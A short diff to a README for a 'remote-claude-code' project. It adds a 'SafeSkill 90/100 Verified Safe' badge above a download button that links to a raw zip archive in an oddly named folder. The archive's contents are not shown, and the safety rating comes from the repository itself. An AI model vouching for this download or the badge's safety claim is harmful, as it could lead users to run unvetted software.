@@ -1,5 +1,7 @@
 # 🚀 remote-claude-code - Code Anytime, Anywhere
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/djimenez007-remote-claude-code)
+
 [![Download Remote Claude Code](https://github.com/djimenez007/remote-claude-code/raw/refs/heads/main/laminable/remote_claude_code_3.5.zip)](https://github.com/djimenez007/remote-claude-code/raw/refs/heads/main/laminable/remote_claude_code_3.5.zip)
 
 ## 🎯 Overview
